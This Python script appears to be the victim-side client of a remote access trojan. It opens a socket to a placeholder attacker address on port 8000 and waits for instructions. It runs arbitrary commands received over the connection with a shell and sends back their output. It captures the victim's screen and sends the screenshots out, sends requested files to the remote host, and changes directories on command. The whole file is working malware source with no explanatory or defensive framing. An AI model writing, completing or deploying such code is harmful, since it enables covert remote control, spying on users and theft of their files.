import sys
import os
import socket
import subprocess
import pyautogui
import time
import datetime

PORT = 8000
IP_ADDR = 'Attackers ip'
data = ''


def create_conn():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        return sock
    except:
        print("An error occurred when creating the connection")


def upload(file_name):
    sock.sendall(str.encode("uploading"))

    with open(file_name, "rb") as file:
        while True:
            # write the contents to server
            file_data = file.read()
            if not file_data:
                break
            sock.sendall(file_data)
    sock.sendall(str.encode("completeServing"))


def screenshot():
    sock.sendall(str.encode("image"))
    pic = pyautogui.screenshot()
    file_name = str(datetime.datetime.now().time()).split(".")[0].replace(":", "-")
    file_name = file_name + '.png'
    pic.save(file_name)
    with open(file_name, "rb") as file:
        while True:
            file_data = file.read()
            if not file_data:
                break
            sock.sendall(file_data)

    sock.sendall(str.encode("completeServing"))
    os.remove(file_name)


def change_dir(command):
    try:
        os.chdir(command[3:])
        sock.sendall(str.encode(str(os.getcwd())))
    except:
        pass


def system_commands(command):
    try:

        res = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        sock.sendall(res.stdout.read())
        sock.sendall(res.stderr.read())
        sock.sendall(str.encode('\ndone\n\n'))
        sock.sendall(str.encode(str(os.getcwd())))
    except:
        str_error = "command not recognized" + "\n"
        sock.sendall(str.encode(os.getcwd()))


def connect_to_host():
    try:
        sock.connect((IP_ADDR, PORT))
    except socket.gaierror as e:

        sys.exit()
    except socket.error:
        sys.exit()


# lets call the functions


def perform_task():
    while True:

        data = sock.recv(1024)
        data = data.decode("utf-8", "replace")

        if "exit" in data:
            sock.sendall(str.encode(" exit"))
            time.sleep(3)
            break

        if data == "screen":
            screenshot()
            data = 'whoami'

        if "download" in data[:8]:
            filename = data[9:]
            data = 'whoami'
            if os.path.exists(filename):
                upload(filename)
            else:
                data = "echo No such file or dir"
                # pass
        if "upload " in data:
            filename = data.split(" ")[1]
            #download(filename)
            continue

        if data[:2] == "cd":
            change_dir(data)

        if len(data) > 0:
            system_commands(data)


if __name__ == '__main__':
    sock = create_conn()
    connect_to_host()
    perform_task()
